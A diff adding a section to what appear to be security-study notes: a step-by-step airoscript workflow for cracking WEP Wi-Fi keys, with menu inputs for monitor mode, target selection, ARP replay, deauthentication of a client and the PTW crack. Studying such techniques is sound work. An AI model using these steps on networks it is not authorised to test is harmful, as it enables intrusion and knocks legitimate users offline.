@@ -225,7 +225,61 @@ which helps generate sufficient IVs required for WEP key cracking.
 > cmd > netsh wlan show drivers
 >```
 
+> [!abstract] WEP Cracking with Airoscript
+> **Wired Equivalent Privacy (WEP)** is a highly vulnerable and obsolete Wi-Fi encryption protocol. `airoscript` is an interactive wrapper script for the Aircrack-ng suite, designed to automate the process of cracking WEP keys.
 
+> [!warning] Context
+> WEP can be cracked easily because of flaws in its IV (Initialization Vector) generation. It requires collecting a large number of packets (usually via ARP replay) to recover the key.
+
+## Step-by-Step Workflow
+
+> [!example]+ Interactive Airoscript Workflow
+> Launch `airoscript` and follow the menu numbers to put the card into monitor mode, select a target, capture traffic, and crack the key.
+> 
+> ```bash
+> # Start airoscript
+> airoscript
+> ```
+> 
+> **Step 1: Interface & Monitor Mode**
+> ```text
+> Option: 1       # Put interface into monitor mode
+> Option: 4       # Select the interface
+> ```
+> 
+> **Step 2: Scanning for Targets**
+> ```text
+> Input number: 1 # Scan
+> Input number: 1 # No filter
+> Input number: 1 # Channel hopping
+> # Press Ctrl + C to stop scanning when you see the target
+> ```
+> 
+> **Step 3: Select Target & Associated Client**
+> ```text
+> Input number: 2 # Select target
+> Input number: * # (Select the specific target number from the list)
+> Option: 1       # Client associated
+> Option: 1       # Select MAC of the associated client
+> ```
+> 
+> **Step 4: Attack (Capture & ARP Replay)**
+> ```text
+> Input number: 3 # Attack
+> Option: 7       # ARP replay automatic (Generates IVs)
+> ```
+> 
+> **Step 5: Deauthentication (Force Traffic)**
+> ```text
+> Input number: 6 # Send deauth packets
+> Option: 3       # Selected client (to force reconnect and generate ARP packets)
+> ```
+> 
+> **Step 6: Cracking the Key**
+> ```text
+> Input number: 4 # Crack option
+> Option: 1       # Aircrack PTW (Use the PTW attack to crack the WEP key)
+> ```
 
 
 
